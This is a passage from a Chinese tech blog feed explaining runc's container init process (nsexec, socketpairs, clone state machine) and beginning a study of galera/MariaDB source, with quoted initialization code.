从环境中读取父进程之前设置的<code>pipe</code>(<code>_LIBCONTAINER_INITPIPE</code>记录的的文件描述符)，然后调用 <strong>nl_parse</strong> 从这个管道中读取配置到变量 <strong>config</strong> ，那么谁会往这个管道写配置呢 ? 当然就是<code>runc create</code>父进程了。父进程通过这个<code>pipe</code>，将新建容器的配置发给子进程，这个过程如下图所示:</p><p><img src="https://segmentfault.com/img/bVblTqN?w=866&h=256" alt="ipc"></p><p>子进程就从父进程处得到了<code>namespace</code>的配置，继续往下， <strong>nsexec()</strong> 又创建了两个<code>socketpair</code>,从注释中了解到，这是为了和它自己的子进程和孙进程进行通信。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nsexec</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   .....</span><br><span class="line">    <span class="comment">/* Pipe so we can tell the child when we've finished setting up. */</span></span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_LOCAL, SOCK_STREAM, <span class="number">0</span>, sync_child_pipe) &lt; <span class="number">0</span>)  <span class="comment">//  sync_child_pipe is an out parameter</span></span><br><span class="line">        bail(<span class="string">"failed to setup sync pipe between parent and child"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We need a new socketpair to sync with grandchild so we don't have</span></span><br><span class="line"><span class="comment">     * race condition with child.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_LOCAL, SOCK_STREAM, <span class="number">0</span>, sync_grandchild_pipe) &lt; <span class="number">0</span>)</span><br><span class="line">        bail(<span class="string">"failed to setup sync pipe between parent and grandchild"</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>switch case</strong> 编写的状态机,大体结构如下，当前进程通过<code>clone()</code>系统调用创建子进程，子进程又通过<code>clone()</code>系统调用创建孙进程，而实际的创建/加入<code>namespace</code>是在子进程完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (setjmp(env)) &#123;</span><br><span class="line">  <span class="keyword">case</span> JUMP_PARENT:&#123;</span><br><span class="line">           .....</span><br><span class="line">           clone_parent(&amp;env, JUMP_CHILD);</span><br><span class="line">           .....</span><br><span class="line">       &#125;</span><br><span class="line">  <span class="keyword">case</span> JUMP_CHILD:&#123;</span><br><span class="line">           ......</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">config</span>.namespaces)</span><br><span class="line">                join_namespaces(<span class="built_in">config</span>.namespaces);</span><br><span class="line">           clone_parent(&amp;env, JUMP_INIT);</span><br><span class="line">           ......</span><br><span class="line">       &#125;</span><br><span class="line">  <span class="keyword">case</span> JUMP_INIT:&#123;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>状态机流程：</p><ol><li><code>namespaces</code>在<code>runc init 2</code>完成创建</li><li><code>runc init 1</code>和<code>runc init 2</code>最终都会执行<code>exit(0)</code>,但<code>runc init 3</code>不会，它会继续执行<code>runc init</code>命令的后半部分。因此最终只会剩下<code>runc create</code>进程和<code>runc init 3</code>进程</li></ol><p><img src="https://segmentfault.com/img/bVblUmM?w=866&h=1312" alt="runc"></p><p>回到代码中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *initProcess)</span> <span class="title">start</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    p.cmd.Start()</span><br><span class="line">    p.process.ops = p</span><br><span class="line">    io.Copy(p.parentPipe, p.bootstrapData);</span><br><span class="line"></span><br><span class="line">    p.execSetns()</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>再向 <code>runc init</code>发送了 <strong>bootstrapData</strong> 数据后，便调用 <strong>execSetns()</strong> 等待<code>runc init 1</code>进程终止，从管道中得到<code>runc init 3</code>的进程 <strong>pid</strong>,将该进程保存在 <strong>p.process.ops</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* libcontainer/process_linux.go */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *initProcess)</span> <span class="title">execSetns</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    status, err := p.cmd.Process.Wait()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> pid *pid</span><br><span class="line">    json.NewDecoder(p.parentPipe).Decode(&amp;pid)</span><br><span class="line"></span><br><span class="line">    process, err := os.FindProcess(pid.Pid)</span><br><span class="line"></span><br><span class="line">    p.cmd.Process = process</span><br><span class="line">    p.process.ops = p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-参考资料"><a href="#3-参考资料" class="headerlink" title="3. 参考资料"></a>3. 参考资料</h3><p><a href="https://segmentfault.com/a/1190000017576314?utm_source=tag-newest" target="_blank" rel="noopener">https://segmentfault.com/a/1190000017576314?utm_source=tag-newest</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;runc原理学习&quot;&gt;&lt;a href=&quot;#runc原理学习&quot; class=&quot;headerlink&quot; title=&quot;runc原理学习&quot;&gt;&lt;/a&gt;runc原理学习&lt;/h2&gt;&lt;h3 id=&quot;1-代码结构&quot;&gt;&lt;a href=&quot;#1-代码结构&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="docker" scheme="http://www.yorzorzy.xyz/categories/docker/"/>
    
    
      <category term="runc" scheme="http://www.yorzorzy.xyz/tags/runc/"/>
    
  </entry>
  
  <entry>
    <title>galera原理和源码学习</title>
    <link href="http://www.yorzorzy.xyz/2020/03/27/galera%E5%8E%9F%E7%90%86/"/>
    <id>http://www.yorzorzy.xyz/2020/03/27/galera%E5%8E%9F%E7%90%86/</id>
    <published>2020-03-27T03:34:48.239Z</published>
    <updated>2020-03-27T03:34:48.239Z</updated>
    
    <content type="html"><![CDATA[<h2 id="galera原理和源码学习"><a href="#galera原理和源码学习" class="headerlink" title="galera原理和源码学习"></a>galera原理和源码学习</h2><h3 id="源码架构"><a href="#源码架构" class="headerlink" title="源码架构"></a>源码架构</h3><p>分析数据库版本： mariadb 10.1.12 + galera 25.3.14</p><p><img src="/images/galera-code-structure.png" alt="galera-code-structure.png"></p><h3 id="源码执行流程"><a href="#源码执行流程" class="headerlink" title="源码执行流程"></a>源码执行流程</h3><p><img src="/images/image-20200310105545840.png" alt="image-20200310105545840"></p><h3 id="一致性协议"><a href="#一致性协议" class="headerlink" title="一致性协议"></a>一致性协议</h3><p>说起totem协议，最简单的形象就是，他将多个节点组成一个令牌环。多个节点手拉手形成一个圈，大家依次的传递token。只有获取到token的节点才有发送消息的权利。简单有效的解决了在分布式系统中各个节点的同步问题，因为只有一个节点会在一个时刻发送消息，不会出现冲突。当然，如果有节点发生意外时，令牌环就会断掉，此时大家不能够通信，而是重新组建出一个新的令牌环。</p><h3 id="galera代码入口"><a href="#galera代码入口" class="headerlink" title="galera代码入口"></a>galera代码入口</h3><p>wsrep是mariadb提供对外的接口，通过虚函数插件的方式加载so库动态链接库的方式来加载外部函数。mariadb可以通过galera的动态链接库来调用galera中实现的函数。galera使用的一致性协议是totem协议。这个协议强一致性，但是存在分区问题。所以galera本身遇到写入冲突的时候，会将节点排出集群之外，类似于“脑裂”的问题。galera只支持innodb数据库。</p><p>wsrep入口在初始化mariadb数据库初始化的时候，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mysqld_main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span>  <span class="comment">// 数据库入口函数</span></span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">   The subsequent calls may take a long time : e.g. innodb log read.</span></span><br><span class="line"><span class="comment">   Thus set the long running service control manager timeout</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_WIN32) &amp;&amp; !defined(EMBEDDED_LIBRARY)</span></span><br><span class="line">  Service.SetSlowStarting(slow_start_timeout);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (init_server_components())   <span class="comment">//初始化入口</span></span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>init_server_components函数初始化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init_server_components</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DBUG_ENTER(<span class="string">"init_server_components"</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    We need to call each of these following functions to ensure that</span></span><br><span class="line"><span class="comment">    all things are initialized so that unireg_abort() doesn't fail</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  mdl_init();   <span class="comment">//初始化元数据锁</span></span><br><span class="line">  tdc_init();   <span class="comment">//Initialize table definition cache.</span></span><br><span class="line">  <span class="keyword">if</span> (hostname_cache_init())</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  query_cache_set_min_res_unit(query_cache_min_res_unit);</span><br><span class="line">  query_cache_result_size_limit(query_cache_limit);</span><br><span class="line">  <span class="comment">/* if we set size of QC non zero in config then probably we want it ON */</span></span><br><span class="line">  <span class="keyword">if</span> (query_cache_size != <span class="number">0</span> &amp;&amp;</span><br><span class="line">      global_system_variables.query_cache_type == <span class="number">0</span> &amp;&amp;</span><br><span class="line">      !IS_SYSVAR_AUTOSIZE(&amp;query_cache_size))</span><br><span class="line">  &#123;</span><br><span class="line">    global_system_variables.query_cache_type= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  query_cache_init();   <span class="comment">// query cache init</span></span><br><span class="line">  query_cache_resize(query_cache_size);           <span class="comment">//重新resize</span></span><br><span class="line">  my_rnd_init(&amp;sql_rand,(ulong) server_start_time,(ulong) server_start_time/<span class="number">2</span>);   <span class="comment">//随机数初始化</span></span><br><span class="line">  setup_fpu();</span><br><span class="line">  init_thr_lock();<span class="comment">//初始化线程锁</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EMBEDDED_LIBRARY</span></span><br><span class="line">  <span class="keyword">if</span> (init_thr_timer(thread_scheduler-&gt;max_threads + extra_max_connections))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Can't initialize timers\n"</span>);</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  my_uuid_init((ulong) (my_rnd(&amp;sql_rand))*<span class="number">12345</span>,<span class="number">12345</span>);  <span class="comment">//初始化uuid</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_REPLICATION</span></span><br><span class="line">  init_slave_list();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  wt_init();  <span class="comment">//初始化wt_wait_table</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Setup logs */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Enable old-fashioned error log, except when the user has requested</span></span><br><span class="line"><span class="comment">    help information. Since the implementation of plugin server</span></span><br><span class="line"><span class="comment">    variables the help output is now written much later.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (opt_error_log &amp;&amp; !opt_abort)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!log_error_file_ptr[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">      fn_format(log_error_file, pidfile_name, mysql_data_home, <span class="string">".err"</span>,</span><br><span class="line">                MY_REPLACE_EXT); <span class="comment">/* replace '.&lt;domain&gt;' by '.err', bug#4997 */</span></span><br><span class="line">      SYSVAR_AUTOSIZE(log_error_file_ptr, log_error_file);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fn_format(log_error_file, log_error_file_ptr, mysql_data_home, <span class="string">".err"</span>,</span><br><span class="line">                MY_UNPACK_FILENAME | MY_SAFE_PATH);</span><br><span class="line">      log_error_file_ptr= log_error_file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!log_error_file[<span class="number">0</span>])</span><br><span class="line">      opt_error_log= <span class="number">0</span>;                         <span class="comment">// Too long file name</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      my_bool res;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EMBEDDED_LIBRARY</span></span><br><span class="line">      res= reopen_fstreams(log_error_file, <span class="built_in">stdout</span>, <span class="built_in">stderr</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      res= reopen_fstreams(log_error_file, <span class="literal">NULL</span>, <span class="built_in">stderr</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!res)</span><br><span class="line">        setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">      <span class="comment">/* Add error log to windows crash reporting. */</span></span><br><span class="line">      add_file_to_crash_report(log_error_file);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* set up the hook before initializing plugins which may use it */</span></span><br><span class="line">  error_handler_hook= my_message_sql;</span><br><span class="line">  proc_info_hook= set_thd_stage_info;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WITH_PERFSCHEMA_STORAGE_ENGINE</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Parsing the performance schema command line option may have reported</span></span><br><span class="line"><span class="comment">    warnings/information messages.</span></span><br><span class="line"><span class="comment">    Now that the logger is finally available, and redirected</span></span><br><span class="line"><span class="comment">    to the proper file when the --log--error option is used,</span></span><br><span class="line"><span class="comment">    print the buffered messages to the log.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  buffered_logs.<span class="built_in">print</span>();</span><br><span class="line">  buffered_logs.cleanup();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WITH_PERFSCHEMA_STORAGE_ENGINE */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EMBEDDED_LIBRARY</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Now that the logger is available, redirect character set</span></span><br><span class="line"><span class="comment">    errors directly to the logger</span></span><br><span class="line"><span class="comment">    (instead of the buffered_logs used at the server startup time).</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  my_charset_error_reporter= charset_error_reporter;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  xid_cache_init(); <span class="comment">//xid缓存初始化</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    initialize delegates for extension observers, errors have already</span></span><br><span class="line"><span class="comment">    been reported in the function</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (delegates_init())</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* need to configure logging before initializing storage engines */</span></span><br><span class="line">  <span class="keyword">if</span> (!opt_bin_log_used &amp;&amp; !WSREP_ON)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (opt_log_slave_updates)</span><br><span class="line">      sql_print_warning(<span class="string">"You need to use --log-bin to make "</span></span><br><span class="line">                        <span class="string">"--log-slave-updates work."</span>);</span><br><span class="line">    <span class="keyword">if</span> (binlog_format_used)</span><br><span class="line">      sql_print_warning(<span class="string">"You need to use --log-bin to make "</span></span><br><span class="line">                        <span class="string">"--binlog-format work."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check that we have not let the format to unspecified at this point */</span></span><br><span class="line">  DBUG_ASSERT((uint)global_system_variables.binlog_format &lt;=</span><br><span class="line">              array_elements(binlog_format_names)<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_REPLICATION</span></span><br><span class="line">  <span class="keyword">if</span> 